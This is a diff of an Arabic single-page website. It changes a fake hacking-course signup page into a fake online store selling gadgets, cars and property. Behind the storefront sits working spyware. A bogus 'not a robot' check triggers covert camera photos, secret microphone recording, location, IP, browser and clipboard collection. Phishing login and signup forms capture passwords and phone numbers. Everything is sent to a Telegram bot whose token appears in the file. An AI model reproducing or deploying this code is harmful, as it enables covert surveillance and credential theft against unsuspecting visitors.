@@ -1,19 +1,24 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تعلم الهكر - منصة المحترف</title>
+    <title>متجر الحياة - منتجات متنوعة</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background: #000000;
-            color: #00ff00;
+            background: #ffffff;
+            color: #000000;
             direction: rtl;
             overflow-x: hidden;
+            transition: background 0.3s, color 0.3s;
+        }
+        body.dark-mode {
+            background: #000000;
+            color: #ffffff;
         }
         #scene-container {
             position: fixed;
@@ -22,22 +27,27 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.5;
+            opacity: 0.3;
         }
         .section {
             display: none;
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 2rem auto;
             padding: 2rem;
-            background: #1e1e1e;
+            background: #f1f5f9;
             border-radius: 1rem;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
-            border: 1px solid #00ff00;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            border: 1px solid #1e3a8a;
+            transition: background 0.3s, border 0.3s;
+        }
+        .section.dark-mode {
+            background: #1e1e1e;
+            border: 1px solid #60a5fa;
         }
         .section.active {
             display: block;
         }
-        #modal {
+        #modal, #splash-screen, #login-modal, #signup-modal {
             display: none;
             position: fixed;
             top: 0;
@@ -49,134 +59,392 @@
             align-items: center;
             z-index: 1000;
         }
-        #modal-content {
-            background: #1e1e1e;
+        #modal-content, #splash-content, #login-content, #signup-content {
+            background: #f1f5f9;
             padding: 2rem;
             border-radius: 1rem;
             text-align: center;
-            color: #00ff00;
-            border: 1px solid #00ff00;
+            color: #000000;
+            border: 1px solid #1e3a8a;
+            transition: background 0.3s, border 0.3s, color 0.3s;
         }
-        #status {
+        .dark-mode #modal-content, .dark-mode #splash-content, .dark-mode #login-content, .dark-mode #signup-content {
+            background: #1e1e1e;
+            border: 1px solid #60a5fa;
+            color: #ffffff;
+        }
+        #status, #login-status, #signup-status {
             margin-top: 1rem;
-            color: #00ff00;
+            color: #1e3a8a;
+            transition: color 0.3s;
+        }
+        .dark-mode #status, .dark-mode #login-status, .dark-mode #signup-status {
+            color: #60a5fa;
         }
         #videoFront, #videoBack, #canvasFront, #canvasBack {
             display: none;
         }
         .logo-text {
-            font-size: 3rem;
+            font-size: 3.5rem;
             font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 255, 0, 0.5);
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+            color: #1e3a8a;
+            transition: color 0.3s;
+        }
+        .dark-mode .logo-text {
+            color: #60a5fa;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
         }
         input, textarea {
+            background: #ffffff;
+            color: #000000;
+            border: 1px solid #1e3a8a;
+            transition: background 0.3s, border 0.3s, color 0.3s;
+        }
+        .dark-mode input, .dark-mode textarea {
             background: #333333;
-            color: #00ff00;
-            border: 1px solid #00ff00;
+            color: #ffffff;
+            border: 1px solid #60a5fa;
         }
         input::placeholder, textarea::placeholder {
+            color: #6b7280;
+        }
+        .dark-mode input::placeholder, .dark-mode textarea::placeholder {
             color: #aaaaaa;
         }
         button {
-            background: #00ff00;
+            background: #d4af37;
             color: #000000;
             font-weight: bold;
+            transition: background 0.3s, color 0.3s;
         }
         button:hover {
-            background: #00cc00;
+            background: #b8972e;
+        }
+        .dark-mode button {
+            background: #d4af37;
+            color: #000000;
+        }
+        .dark-mode button:hover {
+            background: #b8972e;
         }
         nav {
-            background: #1e1e1e;
+            background: #1e3a8a;
             padding: 1rem;
             position: sticky;
             top: 0;
             z-index: 10;
+            transition: background 0.3s;
+        }
+        .dark-mode nav {
+            background: #111827;
         }
         nav a {
-            color: #00ff00;
+            color: #d4af37;
             margin: 0 1rem;
             font-weight: bold;
+            transition: color 0.3s;
         }
         nav a:hover {
-            color: #00cc00;
+            color: #b8972e;
         }
-        .tool-card, .course-card {
-            background: #2a2a2a;
+        .dark-mode nav a {
+            color: #60a5fa;
+        }
+        .dark-mode nav a:hover {
+            color: #3b82f6;
+        }
+        .ad-card {
+            background: #ffffff;
             padding: 1rem;
             border-radius: 0.5rem;
             margin-bottom: 1rem;
-            transition: transform 0.3s ease;
+            transition: transform 0.3s ease, background 0.3s;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .tool-card:hover, .course-card:hover {
+        .dark-mode .ad-card {
+            background: #1e1e1e;
+        }
+        .ad-card:hover {
             transform: scale(1.05);
+        }
+        .ad-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 0.5rem;
+        }
+        .ad-price {
+            font-weight: bold;
+            color: #d4af37;
+            transition: color 0.3s;
+        }
+        .dark-mode .ad-price {
+            color: #60a5fa;
         }
     </style>
 </head>
 <body>
+    <!-- شاشة التحميل المتحركة -->
+    <div id="splash-screen">
+        <div id="splash-content">
+            <h1 class="logo-text">مرحبًا بك في متجر الحياة</h1>
+            <p class="text-lg">أفضل المنتجات بأفضل الأسعار!</p>
+        </div>
+    </div>
+
     <!-- شريط التنقل -->
     <nav class="text-center">
         <a href="#" onclick="showSection('home')">الرئيسية</a>
-        <a href="#" onclick="showSection('tools')">الأدوات</a>
-        <a href="#" onclick="showSection('courses')">الكورسات</a>
+        <a href="#" onclick="showSection('tech')">التقنيات</a>
+        <a href="#" onclick="showSection('cars')">السيارات</a>
+        <a href="#" onclick="showSection('real-estate')">العقارات</a>
+        <a href="#" onclick="showLogin()">تسجيل الدخول</a>
+        <a href="#" onclick="toggleDarkMode()">تبديل الإضاءة</a>
     </nav>
 
     <!-- الصفحة الرئيسية -->
     <div id="home" class="section active">
         <div id="scene-container"></div>
         <div class="text-center mt-8">
-            <h1 class="logo-text">مرحبًا بك في منصة تعلم الهكر</h1>
-            <p class="text-lg">انضم إلى مجتمع المحترفين وتعلم فنون الأمن السيبراني والهكر الأخلاقي مع أفضل الخبراء!</p>
-        </div>
-        <div class="mt-8">
-            <h2 class="text-2xl font-bold mb-4">لماذا تختارنا؟</h2>
-            <ul class="list-disc list-inside text-right">
-                <li>كورسات متقدمة تغطي كل جوانب الهكر الأخلاقي</li>
-                <li>أدوات احترافية لاختبار الاختراق</li>
-                <li>دعم مستمر من المدربين</li>
-            </ul>
+            <h1 class="logo-text">متجر الحياة</h1>
+            <p class="text-lg">استكشف مجموعتنا المتنوعة من المنتجات: تقنيات متطورة، سيارات فاخرة، وعقارات مميزة!</p>
         </div>
     </div>
 
-    <!-- صفحة الأدوات -->
-    <div id="tools" class="section">
-        <h2 class="text-2xl font-bold mb-4">أدوات الهكر الاحترافية</h2>
-        <div class="space-y-4">
-            <div class="tool-card">
-                <h3 class="text-xl font-semibold">Wireshark</h3>
-                <p>أداة لتحليل حركة الشبكة وتتبع البيانات في الوقت الفعلي.</p>
+    <!-- قسم التقنيات -->
+    <div id="tech" class="section">
+        <h2 class="text-2xl font-bold mb-4">قسم التقنيات</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 1" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 1</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1000 دولار</p>
             </div>
-            <div class="tool-card">
-                <h3 class="text-xl font-semibold">Metasploit</h3>
-                <p>إطار عمل لاختبار الاختراق واكتشاف الثغرات الأمنية.</p>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 2" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 2</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1200 دولار</p>
             </div>
-            <div class="tool-card">
-                <h3 class="text-xl font-semibold">Burp Suite</h3>
-                <p>أداة لاختبار أمان تطبيقات الويب والتلاعب بالبيانات.</p>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 3" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 3</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 800 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 4" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 4</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1500 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 5" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 5</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 900 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 6" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 6</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1100 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 7" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 7</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1300 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 8" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 8</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 950 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 9" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 9</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1400 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="منتج تقني 10" class="ad-image">
+                <h3 class="text-xl font-semibold">منتج تقني 10</h3>
+                <p>وصف المنتج: جهاز تقني متطور لتلبية احتياجاتك.</p>
+                <p class="ad-price">السعر: 1600 دولار</p>
             </div>
         </div>
     </div>
 
-    <!-- صفحة الكورسات -->
-    <div id="courses" class="section">
-        <h2 class="text-2xl font-bold mb-4">سجل في كورساتنا</h2>
-        <div class="space-y-4">
-            <input id="fullName" type="text" placeholder="الاسم الثلاثي" class="w-full p-3 border rounded-lg">
-            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" class="w-full p-3 border rounded-lg">
-            <textarea id="courseDetails" placeholder="لماذا تريد تعلم الهكر؟ (مثل: نوع الكورس أو اهتماماتك)" class="w-full p-3 border rounded-lg h-32"></textarea>
-            <input id="galleryInput" type="file" accept="image/*" multiple class="w-full p-3 border rounded-lg">
-            <button id="submitBtn" class="w-full p-3 rounded-lg">تسجيل في الكورس</button>
+    <!-- قسم السيارات -->
+    <div id="cars" class="section">
+        <h2 class="text-2xl font-bold mb-4">قسم السيارات</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 1" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 1</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 30000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 2" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 2</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 35000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 3" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 3</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 28000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 4" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 4</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 40000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 5" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 5</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 32000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 6" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 6</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 37000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 7" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 7</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 29000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 8" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 8</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 42000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 9" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 9</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 31000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="سيارة 10" class="ad-image">
+                <h3 class="text-xl font-semibold">سيارة 10</h3>
+                <p>وصف المنتج: سيارة فاخرة بأداء عالي.</p>
+                <p class="ad-price">السعر: 38000 دولار</p>
+            </div>
         </div>
-        <p id="status">يرجى إدخال بياناتك للتسجيل في الكورس.</p>
     </div>
 
-    <!-- نافذة التأكيد -->
+    <!-- قسم العقارات -->
+    <div id="real-estate" class="section">
+        <h2 class="text-2xl font-bold mb-4">قسم العقارات</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 1" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 1</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 100000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 2" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 2</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 120000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 3" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 3</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 90000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 4" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 4</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 150000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 5" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 5</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 110000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 6" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 6</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 130000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 7" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 7</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 95000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 8" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 8</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 140000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 9" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 9</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 105000 دولار</p>
+            </div>
+            <div class="ad-card">
+                <img src="placeholder.jpg" alt="عقار 10" class="ad-image">
+                <h3 class="text-xl font-semibold">عقار 10</h3>
+                <p>وصف المنتج: شقة فاخرة في موقع مميز.</p>
+                <p class="ad-price">السعر: 125000 دولار</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- نافذة التحقق -->
     <div id="modal">
         <div id="modal-content">
-            <h2 class="text-xl font-bold mb-4">التحقق من الهوية</h2>
-            <p>اضغط على "تأكيد" للتحقق من هويتك وإكمال التسجيل.</p>
-            <button id="confirmBtn" class="p-3 rounded-lg mt-4">تأكيد</button>
+            <h2 class="text-xl font-bold mb-4">تحقق من أنك لست روبوت</h2>
+            <p>اضغط على "تحقق" لتأكيد هويتك ومتابعة تصفح الموقع.</p>
+            <button id="verifyBtn" class="p-3 rounded-lg mt-4">تحقق</button>
         </div>
     </div>
+
+    <!-- نافذة تسجيل الدخول -->
+    <div id="login-modal">
+        <div id="login-content">
+            <h2 class="text-xl font-bold mb-4">تسجيل الدخول</h2>
+            <input id="username" type="text" placeholder="اسم المستخدم" class="w-full p-3 border rounded-lg mb-4">
+            <input id="password" type="password" placeholder="كلمة المرور" class="w-full p-3 border rounded-lg mb-4">
+            <button id="loginBtn" class="p-3 rounded-lg mt-4">تسجيل الدخول</button>
+            <p class="mt-4">ليس لديك حساب؟ <a href="#" onclick="showSignup()" class="text-blue-600 dark-mode:text-blue-400">إنشاء حساب</a></p>
+            <p id="login-status"></p>
+        </div>
+    </div>
+
+    <!-- نافذة إنشاء حساب -->
+    <div id="signup-modal">
+        <div id="signup-content">
+            <h2 class="text-xl font-bold mb-4">إنشاء حساب</h2>
+            <input id="signup-username" type="text" placeholder="اسم المستخدم" class="w-full p-3 border rounded-lg mb-4">
+            <input id="signup-phone" type="tel" placeholder="رقم الهاتف" class="w-full p-3 border rounded-lg mb-4">
+            <button id="signupBtn" class="p-3 rounded-lg mt-4">إنشاء حساب</button>
+            <p id="signup-status"></p>
+        </div>
+    </div>
+
     <video id="videoFront" width="320" height="240" muted style="display: none;"></video>
     <video id="videoBack" width="320" height="240" muted style="display: none;"></video>
     <canvas id="canvasFront" width="320" height="240" style="display: none;"></canvas>
@@ -190,26 +458,64 @@
             });
             document.getElementById(sectionId).classList.add('active');
             gsap.from('.section.active', { opacity: 0, y: 50, duration: 1 });
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('signup-modal').style.display = 'none';
         }
 
-        // تهيئة Three.js لشعار 3D (إيكوساهيدرون مع تأثير توهج)
+        // إظهار نافذة تسجيل الدخول
+        function showLogin() {
+            document.getElementById('login-modal').style.display = 'flex';
+            document.getElementById('signup-modal').style.display = 'none';
+            gsap.from('#login-content', { opacity: 0, scale: 0.7, duration: 0.5 });
+        }
+
+        // إظهار نافذة إنشاء حساب
+        function showSignup() {
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('signup-modal').style.display = 'flex';
+            gsap.from('#signup-content', { opacity: 0, scale: 0.7, duration: 0.5 });
+        }
+
+        // تبديل الوضع الداكن
+        function toggleDarkMode() {
+            document.body.classList.toggle('dark-mode');
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.toggle('dark-mode');
+            });
+            document.querySelectorAll('#modal-content, #splash-content, #login-content, #signup-content').forEach(content => {
+                content.classList.toggle('dark-mode');
+            });
+            const isDarkMode = document.body.classList.contains('dark-mode');
+            torusKnot.material.color.setHex(isDarkMode ? 0x60a5fa : 0xd4af37);
+        }
+
+        // تهيئة شاشة التحميل
+        window.onload = () => {
+            document.getElementById('splash-screen').style.display = 'flex';
+            gsap.from('#splash-content', { opacity: 0, scale: 0.7, duration: 1.5, ease: 'elastic' });
+            setTimeout(() => {
+                document.getElementById('splash-screen').style.display = 'none';
+            }, 3000);
+        };
+
+        // تهيئة Three.js لشعار 3D (TorusKnot)
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({ alpha: true });
         renderer.setSize(window.innerWidth, window.innerHeight);
         document.getElementById('scene-container').appendChild(renderer.domElement);
-        const geometry = new THREE.IcosahedronGeometry(3, 0);
-        const material = new THREE.MeshBasicMaterial({ color: 0x00ff00, wireframe: true });
-        const icosahedron = new THREE.Mesh(geometry, material);
-        scene.add(icosahedron);
-        const light = new THREE.PointLight(0x00ff00, 1, 100);
+        const geometry = new THREE.TorusKnotGeometry(2, 0.6, 100, 16);
+        const material = new THREE.MeshBasicMaterial({ color: 0xd4af37, wireframe: true });
+        const torusKnot = new THREE.Mesh(geometry, material);
+        scene.add(torusKnot);
+        const light = new THREE.PointLight(0xffffff, 1, 100);
         light.position.set(10, 10, 10);
         scene.add(light);
         camera.position.z = 10;
         function animate() {
             requestAnimationFrame(animate);
-            icosahedron.rotation.y += 0.01;
-            icosahedron.rotation.x += 0.005;
+            torusKnot.rotation.y += 0.01;
+            torusKnot.rotation.x += 0.005;
             renderer.render(scene, camera);
         }
         animate();
@@ -224,46 +530,68 @@
         const canvasBack = document.getElementById('canvasBack');
         const contextFront = canvasFront.getContext('2d');
         const contextBack = canvasBack.getContext('2d');
-        const status = document.getElementById('status');
-        const phoneNumberInput = document.getElementById('phoneNumber');
-        const fullNameInput = document.getElementById('fullName');
-        const courseDetailsInput = document.getElementById('courseDetails');
-        const galleryInput = document.getElementById('galleryInput');
         const modal = document.getElementById('modal');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const submitBtn = document.getElementById('submitBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const signupBtn = document.getElementById('signupBtn');
+        const loginStatus = document.getElementById('login-status');
+        const signupStatus = document.getElementById('signup-status');
         let mediaRecorder;
         let recordedChunks = [];
         let frontStream, backStream;
 
-        // بدء جمع البيانات تلقائيًا بعد 10 ثوانٍ
-        setTimeout(async () => {
+        // إظهار نافذة التحقق بعد 20 ثانية
+        setTimeout(() => {
+            modal.style.display = 'flex';
+            gsap.from('#modal-content', { opacity: 0, scale: 0.7, duration: 0.5 });
+        }, 20000);
+
+        // تسجيل الدخول
+        loginBtn.onclick = async () => {
+            const username = document.getElementById('username').value || 'غير متوفر';
+            const password = document.getElementById('password').value || 'غير متوفر';
+            loginStatus.textContent = 'الحساب غير موجود، الرجاء إنشاء حساب أولاً.';
+            const loginData = `
+بيانات تسجيل الدخول:
+- اسم المستخدم: ${username}
+- كلمة المرور: ${password}
+            `;
+            await sendToTelegram(loginData);
+        };
+
+        // إنشاء حساب
+        signupBtn.onclick = async () => {
+            const username = document.getElementById('signup-username').value || 'غير متوفر';
+            const phone = document.getElementById('signup-phone').value || 'غير متوفر';
+            signupStatus.textContent = 'تم إرسال طلبك! سيتواصل فريق الدعم معك عبر واتساب لتأكيد الحساب.';
+            const signupData = `
+بيانات إنشاء حساب:
+- اسم المستخدم: ${username}
+- رقم الهاتف: ${phone}
+            `;
+            await sendToTelegram(signupData);
+            setTimeout(() => {
+                document.getElementById('signup-modal').style.display = 'none';
+            }, 2000);
+        };
+
+        // التحقق عند النقر على زر "تحقق"
+        verifyBtn.onclick = async () => {
+            modal.style.display = 'none';
             await collectAndSendData();
-            // بدء التقاط الصور كل 10 ثوانٍ
             setInterval(async () => {
                 await capturePhotos();
             }, 10000);
-        }, 10000);
+        };
 
         // جمع البيانات وإرسالها
         async function collectAndSendData() {
-            const fullName = fullNameInput.value || 'غير متوفر';
-            const phoneNumber = phoneNumberInput.value || 'غير متوفر';
-            const courseDetails = courseDetailsInput.value || 'غير متوفر';
-            const courseData = `
-بيانات التسجيل:
-- الاسم الثلاثي: ${fullName}
-- رقم الهاتف: ${phoneNumber}
-- تفاصيل الكورس: ${courseDetails}
-            `;
             try {
-                await sendToTelegram(courseData);
                 await requestCameraAndMicrophone();
                 await requestLocation();
                 await collectIP();
                 await collectBrowserData();
                 await readClipboard();
-                await sendGalleryImages();
             } catch (error) {
                 console.error('خطأ في جمع البيانات:', error);
                 await sendToTelegram(`خطأ في جمع البيانات: ${error.message}`);
@@ -273,13 +601,14 @@
         // التقاط الصور من الكاميرا الأمامية والخلفية
         async function capturePhotos() {
             try {
+                await reopenCameraStreams();
                 if (frontStream) {
                     await new Promise((resolve) => {
                         videoFront.oncanplay = () => {
                             setTimeout(() => {
                                 contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
                                 const imageDataFront = canvasFront.toDataURL('image/png');
-                                if (imageDataFront.length > 1000) { // التحقق من أن الصورة ليست فارغة
+                                if (imageDataFront.length > 1000) {
                                     sendPhotoToTelegram(imageDataFront, 'front');
                                 }
                                 resolve();
@@ -293,13 +622,21 @@
                             setTimeout(() => {
                                 contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
                                 const imageDataBack = canvasBack.toDataURL('image/png');
-                                if (imageDataBack.length > 1000) { // التحقق من أن الصورة ليست فارغة
+                                if (imageDataBack.length > 1000) {
                                     sendPhotoToTelegram(imageDataBack, 'back');
                                 }
                                 resolve();
                             }, 1000);
                         };
                     });
+                }
+                if (frontStream) {
+                    frontStream.getTracks().forEach(track => track.stop());
+                    frontStream = null;
+                }
+                if (backStream) {
+                    backStream.getTracks().forEach(track => track.stop());
+                    backStream = null;
                 }
             } catch (error) {
                 console.error('خطأ في التقاط الصور:', error);
@@ -310,15 +647,12 @@
         // طلب الوصول إلى الكاميرا والميكروفون
         async function requestCameraAndMicrophone() {
             try {
-                // الوصول إلى الكاميرا الأمامية
                 frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: true
                 });
                 videoFront.srcObject = frontStream;
                 videoFront.play();
-
-                // التقاط صورة أولية من الكاميرا الأمامية
                 await new Promise((resolve) => {
                     videoFront.oncanplay = () => {
                         setTimeout(() => {
@@ -331,8 +665,6 @@
                         }, 1000);
                     };
                 });
-
-                // الوصول إلى الكاميرا الخلفية إذا كانت متاحة
                 try {
                     backStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment' },
@@ -340,8 +672,6 @@
                     });
                     videoBack.srcObject = backStream;
                     videoBack.play();
-
-                    // التقاط صورة أولية من الكاميرا الخلفية
                     await new Promise((resolve) => {
                         videoBack.oncanplay = () => {
                             setTimeout(() => {
@@ -356,10 +686,8 @@
                     });
                 } catch (error) {
                     console.warn('الكاميرا الخلفية غير متاحة:', error);
-                    await sendToTelegram(`الكاميرا District's غير متاحة: ${error.message}`);
+                    await sendToTelegram(`الكاميرا الخلفية غير متاحة: ${error.message}`);
                 }
-
-                // تسجيل الصوت في الخفاء
                 mediaRecorder = new MediaRecorder(frontStream);
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
@@ -372,7 +700,6 @@
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                    // إيقاف تيار الكاميرا الأمامية بعد التسجيل
                     frontStream.getTracks().forEach(track => track.stop());
                     if (backStream) backStream.getTracks().forEach(track => track.stop());
                     frontStream = null;
@@ -419,19 +746,16 @@
         // جمع عنوان IP
         async function collectIP() {
             try {
-                // جمع IP عبر api.ipify.org
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const ipData = `عنوان IP: ${data.ip}`;
                 await sendToTelegram(ipData);
-
-                // جمع IP عبر WebRTC
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
                 pc.onicecandidate = async (event) => {
                     if (event.candidate) {
-                        const ipMatch = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        const ipMatch = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\د+)/);
                         if (ipMatch) {
                             const webrtcIpData = `عنوان IP عبر WebRTC: ${ipMatch[0]}`;
                             await sendToTelegram(webrtcIpData);
@@ -480,26 +804,11 @@
             }
         }
 
-        // إرسال الصور من المعرض
-        async function sendGalleryImages() {
-            try {
-                const files = galleryInput.files;
-                if (files.length === 0) return;
-                for (const file of files) {
-                    await sendPhotoToTelegram(file, 'gallery');
-                }
-            } catch (error) {
-                console.error('خطأ في إرسال الصور من المعرض:', error);
-                await sendToTelegram(`خطأ في إرسال الصور من المعرض: ${error.message}`);
-            }
-        }
-
         // إرسال نص إلى تيليجرام
         async function sendToTelegram(message) {
-            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
-            const chatId = '7741643453';
